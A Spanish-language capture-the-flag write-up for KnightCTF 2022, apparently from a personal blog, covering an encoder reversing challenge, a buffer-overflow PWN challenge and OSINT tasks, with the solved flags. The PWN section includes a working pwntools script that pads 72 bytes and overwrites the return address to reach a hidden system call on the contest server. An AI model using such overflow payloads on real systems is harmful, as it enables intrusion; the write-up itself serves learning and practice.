I"<<p>KnightCTF 2022, es el primer <em>capture de flag</em> organizado por <a href="https://knightsquad.org/">Knight Squad</a>, este es de tipo <em>jeopardy</em>, por lo que encontraremos distintas categorias.</p>

<div style="text-align:center">
  <img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/1.png" />
</div>

<h3 id="reverse-engineering"><a href="#header-3"></a>Reverse Engineering</h3>

<h4 id="the-encoder"><a href="#header-4"></a>The Encoder</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/2.png" alt="" /></p>

<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/the_encoder.zip">the_encoder.out</a>, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier caracter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/3.png" alt="" /></p>

<p>Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros.</p>

<p>Podemos consultar una <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/4.png">tabla de código ASCII</a>, para saber en que orden van los caracteres, y así simplificar las cosas.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/5.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{s1Mpl3_3Nc0D3r_1337}
</code></pre></div></div>

<h3 id="pwn"><a href="#header-3"></a>PWN</h3>

<h4 id="whats-your-name"><a href="#header-4"></a>What’s Your Name</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/6.png" alt="" /></p>

<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/whats_your_name.zip">whats_your_name</a>, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/7.png" alt="" /></p>

<p>Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>, lo cual nos da la idea de un posible <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/8.png" alt="" /></p>

<p>Podemos empezar a depurar el binario con <code class="language-plaintext highlighter-rouge">GEF</code>, tal y como lo hicimos en la máquina <a href="https://mateonitro550.github.io/Safe-Hack-The-Box">Safe</a> de <em>Hack The Box</em>, y nos daremos cuenta que el <em>buffer</em> tiene una longitud de <em>72 bytes</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/9.png" alt="" /></p>

<p>Ya con esto en mente, podemos analizar el binario con <code class="language-plaintext highlighter-rouge">Ghidra</code>, y nos daremos cuenta que dentro de la función <code class="language-plaintext highlighter-rouge">main</code>, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un <code class="language-plaintext highlighter-rouge">cat</code> al archivo <code class="language-plaintext highlighter-rouge">/home/hacker/flag.txt</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/10.png" alt="" /></p>

<p>De modo que teniendo control sobre el registro <code class="language-plaintext highlighter-rouge">RIP</code>, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en <code class="language-plaintext highlighter-rouge">Python</code>, bastante parecido al de la máquina <a href="https://mateonitro550.github.io/Safe-Hack-The-Box">Safe</a> de <em>Hack The Box</em>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"198.211.115.81"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011d3</span><span class="p">)</span>

<span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{bAbY_bUfF3r_0v3Rf1Ow}
</code></pre></div></div>

<h3 id="osint"><a href="#header-3"></a>OSINT</h3>

<h4 id="canada-server"><a href="#header-4"></a>Canada Server</h4>

<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/11.png" alt="" /></p>

<p>Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet.</p>

<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/12.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{192.99.167.83}
</code></pre></div></div>

<h4 id="find-the-camera"><a href="#header-4"></a>Find The Camera</h4>

<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/13.png" alt="" /></p>

<p>Una vez descargamos el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/bus.png">archivo adjunto</a>, vamos a darnos cuenta que los derechos de autor le pertenecen a <code class="language-plaintext highlighter-rouge">JenCh012</code>, así que procedemos a buscarlo.</p>

<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/14.png" alt="" /></p>

<p>Vemos que a parte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que, entraremos en el primer resultado, por ejemplo.</p>

:ET